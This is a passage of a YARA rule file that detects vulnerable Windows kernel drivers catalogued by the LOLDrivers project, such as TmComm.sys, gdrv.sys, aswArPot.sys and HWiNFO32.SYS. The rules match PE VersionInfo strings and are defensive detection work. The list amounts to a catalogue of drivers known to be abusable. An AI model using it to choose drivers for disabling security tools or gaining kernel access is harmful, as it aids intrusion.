004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Wisecleanercom_Wiseunlosys_Wiseunlo_9D53_RID3C83 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WiseUnlo.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:15:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069007300650055006e006c006f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069007300650043006c00650061006e00650072002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0031002e00310032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0031002e00310032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069007300650055006e006c006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069007300650055006e006c006f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00570069007300650055006e006c006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000310035 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_BCFC_RID3DDA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:12:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e00330030002e0030002e0031003000340039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrddkprovider_Gdrvsys_Windowsrddkdriver_F4FF_RID40F1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:24:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041004200590054004500200054006f006f006c0073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031003600320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300030002e0032003100390035002e0031003600320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200032003000300030002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d006900630072006f0073006f0066007400200043006f00720070002e00200031003900380031002d0031003900390039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_DBC6_RID3DCB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:09:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00350030002e0030002e0031003000340031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100340020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Corsairmemoryinc_Corsairllaccess_Corsairllaccess_F15A_RID41AF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CorsairLLAccess64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:55:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310035002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310035002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f007200730061006900720020004c004c0020004100630063006500730073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007200730061006900720020004d0065006d006f00720079002c00200049006e0063002e002000280063002900200032003000310039002c00200041006c006c0020007200690067006800740073002000720065007300650072007600650064 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_4E37_RID3DAF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100340030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003200310020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_ECD0_RID3DC8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:09:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e0030002e0030002e0031003100370036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_6701_RID3D38 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:45:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e003300300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100310020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Radiantsystemsinc_Radhwmgrsys_Radiantsystemsinchardwaremanagerdriver_00C3_RID4A32 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - RadHwMgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:58:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061006400690061006e00740020004800610072006400770061007200650020004d0061006e006100670065007200200066006f007200200050003100350078007800200050006c006100740066006f0072006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0030002e003200320020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0030002e00320032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e00200020004800610072006400770061007200650020004d0061006e00610067006500720020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00520061006400480077004d00670072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000300032002d0032003000300034002000520061006400690061006e0074002000530079007300740065006d0073002c00200049006e0063002e0020 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_DEE3_RID345D : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:27:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310032002e003300300032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310032002e003300300032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]003300360030786c4ef659275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100320020003300360030002e0063006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_36E3_RID3D62 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:52:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0033002e00360038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0033002e00360038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003000200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_FDA9_RID3DD0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:10:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003100310037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_6E9E_RID3D63 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:52:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003800300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00380030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100300020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_1228_RID3BA2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:37:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002c00200033002c00200031002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002c00200033002c00200031002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003400200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Biostargroup_Iodriver_Biostariodriver_D205_RID3D3A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - BS_RCIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:45:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049002f004f00200049006e00740065007200660061006300650020006400720069007600650072002000660069006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00420049004f0053005400410052002000470072006f00750070 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e0031003900300031002e0031003100300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e0031003900300031002e0031003100300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049002f004f0020006400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00420049004f005300540041005200200049002f004f0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00420053005f005200430049004f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310038002d0032003000310039002000420049004f0053005400410052002000470072006f00750070 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Amifldrvsys_Windowsrwinddkdriver_38D8_RID4510 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - amifldrv64.sys, amifldrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:19:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004d0049002000470065006e00650072006900630020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310030003000310031002e00310036003300380034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310030003000310031002e00310036003300380034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0061006d00690066006c006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0061006d00690066006c006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Inferre_Hwdetectngsys_Hwdetectngsys_D456_RID3C68 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - hwdetectng.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:10:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00480057004400650074006500630074004e0047 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0069004e00460045005200520045 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00380020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00680077006400650074006500630074006e0067002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00680077006400650074006500630074006e0067002e007300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00680077006400650074006500630074006e0067002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280063002900200032003000300038002d0030003900200069004e00460045005200520045 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and 